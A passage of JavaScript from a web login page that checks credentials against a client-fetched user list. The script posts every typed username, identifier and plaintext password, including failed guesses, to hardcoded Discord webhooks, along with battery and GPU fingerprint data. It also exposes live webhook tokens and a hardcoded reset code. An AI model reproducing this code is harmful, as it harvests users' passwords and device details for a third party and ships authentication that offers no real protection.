        reset_detected: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq',
        reset_success: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB',
        reset_fail: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip',
      };

      const webhookUrls = { /* ... Original webhook URLs ... */ };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = [];
      let loginTime = null;

      showPasswordCheckbox.addEventListener('change', () => { passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password'; });

      // Fetch user data and then start preloader
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => { users = data; animatePreloader(); })
        .catch((err) => { console.error('Failed to load user JSON data:', err); users = []; animatePreloader(); });

      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      function getWebGLRenderer() { 
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch (e) { return "Unavailable"; }
      }
      async function getBatteryStatus() {
        if ('getBattery' in navigator) {
          try { return await navigator.getBattery(); } catch (e) { return null; }
        }
        return null;
      }

      function findUser(username, userID) { 
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      async function sendWebhook(url, embed) { 
        try {
          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
          if (!response.ok) console.warn(`Webhook failed for ${url}: ${response.statusText}`);
        } catch (e) { console.warn('Webhook fetch error:', e); }
      }

      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();
        return {
          user: user, password: password, loginTime: loginTime,
          batteryStatus: batteryStatus, webglRenderer: getWebGLRenderer(),
        };
      }

      // Logging functions (simplified calls)
      async function logUsername(name, username) { await sendWebhook(loggingWebhooks.username, { title: "Username Logging", color: 0x3498db, fields: [{ name: "Name", value: name || "N/A", inline: true },{ name: "Username", value: username, inline: true },{ name: "Date/Time", value: new Date().toISOString(), inline: false }] }); }
      async function logPassword(name, password) { await sendWebhook(loggingWebhooks.password, { title: "Password Logging", color: 0xe74c3c, fields: [{ name: "Name", value: name || "N/A", inline: true },{ name: "Password", value: password, inline: true },{ name: "Date/Time", value: new Date().toISOString(), inline: false }] }); }
      async function logIdentifier(name, identifier) { await sendWebhook(loggingWebhooks.identifier, { title: "Identifier Logging", color: 0x2ecc71, fields: [{ name: "Name", value: name || "N/A", inline: true },{ name: "Identifier", value: identifier, inline: true },{ name: "Date/Time", value: new Date().toISOString(), inline: false }] }); }
      async function logInvalidUsername(name, username) { await sendWebhook(loggingWebhooks.invalid_username, { title: "Invalid Username Logging", color: 0xf39c12, fields: [{ name: "Name", value: name || "N/A", inline: true },{ name: "Invalid Username", value: username, inline: true },{ name: "Date/Time", value: new Date().toISOString(), inline: false }] }); }
      async function logInvalidPassword(name, password) { await sendWebhook(loggingWebhooks.invalid_password, { title: "Invalid Password Logging", color: 0xe67e22, fields: [{ name: "Name", value: name || "N/A", inline: true },{ name: "Invalid Password", value: password, inline: true },{ name: "Date/Time", value: new Date().toISOString(), inline: false }] }); }
      async function logInvalidIdentifier(name, identifier) { await sendWebhook(loggingWebhooks.invalid_identifier, { title: "Invalid Identifier Logging", color: 0xd35400, fields: [{ name: "Name", value: name || "N/A", inline: true },{ name: "Invalid Identifier", value: identifier, inline: true },{ name: "Date/Time", value: new Date().toISOString(), inline: false }] }); }
      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) { await sendWebhook(loggingWebhooks.attempts_counter, { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [{ name: "Name", value: name || "N/A", inline: true },{ name: "Username", value: username, inline: true },{ name: "Password", value: password, inline: true },{ name: "Identifier", value: identifier, inline: true },{ name: "Attempts Left", value: attemptsLeft.toString(), inline: true },{ name: "Date/Time", value: new Date().toISOString(), inline: false }] }); }
      async function logAttemptsExceeded(name, username, password, identifier) { await sendWebhook(loggingWebhooks.attempts_exceeded, { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [{ name: "Name", value: name || "N/A", inline: true },{ name: "Username", value: username, inline: true },{ name: "Password", value: password, inline: true },{ name: "Identifier", value: identifier, inline: true },{ name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },{ name: "Date/Time", value: new Date().toISOString(), inline: false }] }); }

      function buildUserLoggingEmbed(data) { /* ... embed builder ... */ }
      function buildBrowserLoggingEmbed(data) { /* ... embed builder ... */ }
      function buildDeviceLoggingEmbed(data) { /* ... embed builder ... */ }
      function buildConnectionLoggingEmbed(data) { /* ... embed builder ... */ }
      function buildSessionLoggingEmbed(data) { /* ... embed builder ... */ }

      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.'; return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        await logAttemptsCounter(user?.name || "Unknown", username, password, userID, attempts);

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found or invalid credentials.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login flow
        attempts = 5;
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';

        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';

        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        const loggingData = await collectLoggingData(user, password);

        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Transition to dashboard
        loginBox.style.display = 'none';
        document.body.classList.add('dashboard-body');
        document.getElementById('dashboard').style.display = 'block';
        document.getElementById('loggedInUserDisplay').textContent = `User - ${user.name || user.username}`;
        document.getElementById('loggedInID').textContent = userID;
        // dashboard.init() is called after preloader completes
      }

      function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'Maximum login attempts exceeded. Please reset.';
          logAttemptsExceeded(user?.name || "Unknown", usernameInput.value, passwordInput.value, userIDInput.value);
          showResetPopup();
          disableInputs();
        } else if (attempts <= 3) {
          flashRedOutline(2, 400);
        }
      }

      function updateAttemptsText() { attemptsText.textContent = `Attempts Left: ${attempts}`; }
      function disableInputs() {
        usernameInput.disabled = true; passwordInput.disabled = true; userIDInput.disabled = true; submitBtn.disabled = true;
      }
      function enableInputs() {
        usernameInput.disabled = false; passwordInput.disabled = false; userIDInput.disabled = false; submitBtn.disabled = false;
      }
      function showResetPopup() { resetPopup.style.display = 'block'; resetPopup.setAttribute('aria-hidden', 'false'); resetField.focus(); }
      function hideResetPopup() { resetPopup.style.display = 'none'; resetPopup.setAttribute('aria-hidden', 'true'); resetField.value = ''; }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const correctResetCode = 'Reset.Counter.2579'; 
        const isCorrect = enteredCode === correctResetCode;

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        const resetBoxEmbed = { /* ... embed for reset detection ... */ };
        await sendWebhook(loggingWebhooks.reset_detected, resetBoxEmbed);

        const resultEmbed = { /* ... embed for reset success/fail ... */ };
        const resultWebhookUrl = isCorrect ? loggingWebhooks.reset_success : loggingWebhooks.reset_fail;
        await sendWebhook(resultWebhookUrl, resultEmbed);

        if (isCorrect) {
          attempts = 5;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
        } else {
          alert('Incorrect reset code. Please try again.');
        }
      }

      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      document.addEventListener('keydown', e => {
        if (resetPopup.style.display === 'block' && e.key === 'Enter') { e.preventDefault(); resetCounter(); } 
        else if (e.key === 'Enter' && submitBtn.style.display !== 'none') { e.preventDefault(); submitLogin(); }
      });

      updateAttemptsText(); // Initial display
      // Initial state: loginBox visible, dashboard hidden. Preloader manages the transition.
    })();
  </script>

</body>
</html>
